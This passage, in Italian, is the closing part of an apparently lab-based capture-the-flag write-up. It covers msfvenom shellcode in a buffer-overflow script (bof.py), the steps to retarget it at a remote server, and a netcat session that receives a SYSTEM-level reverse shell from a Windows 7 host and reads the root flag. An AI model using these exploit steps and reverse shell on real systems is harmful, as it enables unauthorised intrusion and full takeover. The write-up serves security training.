shellcode += b"\x31\xc9\xb1\x52\x31\x58\x12\x03\x58\x12\x83\x13"........
```
	Questo è il nostro shellcode da MSFVenom


eseguiamo 
```
python3 bof.py 
```

ed **otteniamo la nostra reverse shell in locale sul nostro pc in locale**
per ottenerla sul server reale bisogna sostituire nello script l'indirizzo IP con quello del server remoto e lo shellcode con quello rigenerato da msfvenom dopo aver sostituito IP con quello attuale di kali
(operazione che nel frattempo ho compiuto)

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.179.93] 49192
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd ..
cd ..

C:\Windows>cd ..
cd ..

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C87F-5040

 Directory of C:\

08/29/2019  08:36 PM    <DIR>          ftp
08/29/2019  08:31 PM    <DIR>          inetpub
07/13/2009  08:20 PM    <DIR>          PerfLogs
11/21/2010  12:16 AM    <DIR>          Program Files
08/29/2019  08:28 PM    <DIR>          Program Files (x86)
08/29/2019  10:20 PM    <DIR>          Users
09/02/2019  05:36 PM    <DIR>          Windows
               0 File(s)              0 bytes
               7 Dir(s)  19,703,820,288 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C87F-5040

 Directory of C:\Users

08/29/2019  10:20 PM    <DIR>          .
08/29/2019  10:20 PM    <DIR>          ..
08/29/2019  10:21 PM    <DIR>          drake
11/21/2010  12:16 AM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)  19,703,820,288 bytes free

C:\Users>cd drake
cd drake

C:\Users\drake>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C87F-5040

 Directory of C:\Users\drake

08/29/2019  10:21 PM    <DIR>          .
08/29/2019  10:21 PM    <DIR>          ..
08/29/2019  10:21 PM    <DIR>          Contacts
08/29/2019  10:55 PM    <DIR>          Desktop
08/29/2019  10:21 PM    <DIR>          Documents
08/29/2019  10:27 PM    <DIR>          Downloads
08/29/2019  10:21 PM    <DIR>          Favorites
08/29/2019  10:21 PM    <DIR>          Links
08/29/2019  10:21 PM    <DIR>          Music
08/29/2019  10:21 PM    <DIR>          Pictures
08/29/2019  10:21 PM    <DIR>          Saved Games
08/29/2019  10:21 PM    <DIR>          Searches
08/29/2019  10:21 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  19,703,820,288 bytes free

C:\Users\drake>cd Desktop
cd Desktop

C:\Users\drake\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C87F-5040

 Directory of C:\Users\drake\Desktop

08/29/2019  10:55 PM    <DIR>          .
08/29/2019  10:55 PM    <DIR>          ..
08/29/2019  10:55 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  19,703,808,000 bytes free

C:\Users\drake\Desktop>type root.txt
type root.txt
xxxxxxxxxxxxxx
C:\Users\drake\Desktop>
```
Il laboratorio è stato abbastanza impegnativo e non nego di aver trovato un poco di difficoltà in quanto era parecchio tempo che non affrontavo questo tipo di stanze, sforzo ripagato dalla soddisfazione di aver scoperto la flag!
